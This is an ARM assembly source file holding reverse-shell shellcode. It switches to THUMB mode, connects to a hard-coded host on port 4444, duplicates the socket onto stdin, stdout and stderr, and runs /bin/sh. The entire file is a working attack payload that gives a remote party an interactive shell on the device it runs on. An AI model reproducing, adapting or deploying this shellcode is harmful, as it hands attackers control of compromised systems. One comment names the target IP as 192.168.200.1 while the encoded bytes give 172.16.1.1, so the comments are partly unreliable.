// This code sets up a socket and connects to IP provided. 
// A SH is created and STDIN, STDOUT and STDERR are rediercted through this connection
// It starts of in ARM mode and then switches to THUMB mode to reduce shellcode size

.section .text
.global _start

_start:

// ARM 32 bit mode
.code 32
	add r3, pc, #1;			// Setup to transition to THUMB mode. Reg r3 = pc + 1
	bx r3;				// branch to r3 and execute

// THUMB 16bit mode
.code 16				
	mov r0, #2;
	mov r1, #1;
	eor r2, r2;
	movw r7, #281;
	svc #1;				// call socket(PF_INET, SOCK_STREAM, IPPROTO_IP) 
	mov r4, r0;			// maintain our socket address needed for the dup2 functions later on
	adr r1, address;		// ptr to our ip and port address below
//	add r1, pc, #44;		// alternate way to store ptr to socket params below
	mov r6, r6;
	mov r2, #16;
	movw r7, #283;
	svc #1;				// call connect(3, "192.168.200.1", 16)

	mov r0, r4;
	mov r1, #2;
	mov r7, #63; 
	svc #1;				// dup2(3,2) stderr
	
	mov r0, r4;
	mov r1, #1;
	mov r7, #63; 
	svc #1;				// dup(3,1) stdout
	
	mov r0, r4;
	eor r1, r1;
	mov r7, #63; 
	svc #1;				// dup(3,0) stdin

	adr r0, shell;			// move ptr to the string /bin/sh into r0
//	add r0, pc, #16;		// alternate method to point to path below. 16 bytes to shell below
	eor r1, r1;
	eor r2, r2;
	mov r7, #11; 
	svc #1;		//call execve("/bin/sh")

address:
	.ascii "\x02\x00"		//
	.ascii "\x11\x5c"		// port 4444
	.byte 172,16,1,1		//target IP

shell:
	.ascii "/bin/sh"
